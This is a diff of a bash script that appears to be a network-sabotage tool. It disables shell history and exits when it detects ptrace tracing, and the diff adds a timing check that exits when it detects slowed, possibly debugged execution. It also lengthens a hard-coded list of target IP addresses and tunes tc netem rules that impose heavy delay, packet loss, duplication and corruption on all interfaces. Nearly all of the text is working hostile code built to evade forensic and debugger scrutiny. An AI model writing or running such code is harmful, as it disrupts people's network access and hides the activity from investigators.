@@ -3,6 +3,19 @@ export HISTFILE=/dev/null
 unset HISTFILE
 unset HISTSIZE
 unset HISTFILESIZE
+max_delay=1000000000
+for attempt in {1..3}; do
+    start=$(date +%s%N)
+    for i in {1..100000}; do
+        :  
+    done
+    end=$(date +%s%N)
+    elapsed=$((end - start))
+    if (( elapsed > max_delay )); then
+        echo "[!] Execution delay detected"
+        exit 1
+    fi
+done
 ptrace_check=$(grep TracerPid /proc/$$/status | awk "{print \$2}")    
 if [ "$ptrace_check" != "0" ]; then    
     echo "[!] Traced via ptrace. Exiting..."    
@@ -640,7 +653,8 @@ IP_LIST=(
   "23.33.126.163" "13.35.185.99" "23.33.184.252" "23.202.34.146" "142.251.163.94" "23.2.16.89"
   "23.219.172.106" "23.2.16.99" "54.230.129.100" "142.251.179.94" "3.163.198.41" "23.202.35.203"
   "23.202.34.112" "23.202.35.226" "23.202.35.99" "13.33.45.58" "23.33.126.169" "18.65.159.41"
-  "18.65.148.83" "18.65.125.115"
+  "18.65.148.83" "18.65.125.115" "18.65.159.22" "18.155.68.106" "18.65.159.51" "18.65.112.114"
+  "23.56.0.209" "23.33.126.174"
 )
 spinner="/-\|"
 i=0
@@ -663,7 +677,7 @@ for IFACE in "${IFACES[@]}"; do
   delay 2200ms 400ms \
   loss 38% 100% \
   duplicate 2% 100% \
-  corrupt 45% 90% \
+  corrupt 47% 90% \
   reorder 100% 100% > /dev/null 2>&1
   tc filter add dev "$IFACE" parent 1: protocol ip prio 1 handle 10 fw flowid 1:10 > /dev/null 2>&1
 done
